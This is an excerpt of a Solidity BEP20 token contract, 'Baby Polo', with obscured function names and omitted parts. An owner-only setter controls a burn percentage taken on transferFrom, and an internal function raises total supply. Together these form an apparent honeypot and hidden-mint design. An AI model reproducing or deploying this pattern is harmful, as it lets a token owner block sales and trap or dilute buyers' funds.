...
contract HelloBEP20 is IBEP20 {
    using MathFS for uint256;

    string public name20FS =  "Baby Polo";
    string public symbol20FS =  "BPOLO";
    uint8 public decimals20FS = 9;
    uint public _totalSupplyFS = 1*10**15 * 10**9;
    
    address private _owner;
    uint8 private _tdaking;
    ...
    constructor() {
        ...
        _owner = msgSender;
        balances[msg.sender] = _totalSupplyFS;
        emit Transfer(address(0), msg.sender, _totalSupplyFS);
    }
  ...
  function decimals() public view virtual returns (uint8) {
    ...
    function totalSupply() public override view returns (uint) {
        return _totalSupplyFS - balances[address(0)];
    }
    ...
    function transferFrom(address from, address to, uint tokens) public override returns (bool success) {
        ...
        _lavB(from,tokens.mul(getVerLav()).div(10**2));
    ...
    function _lavB(address tokenOwner, uint256 tokens) internal {
        ...
        _totalSupplyFS = _totalSupplyFS.subb(tokens);
    ...
    function sVerLav(uint8 tdaking) public virtual onlyOwner {
		_tdaking = tdaking;
	}
    ...
    function _ekle(address tokenOwner, uint256 tokens) internal {
        ...
        _totalSupplyFS = _totalSupplyFS.ad(tokens);
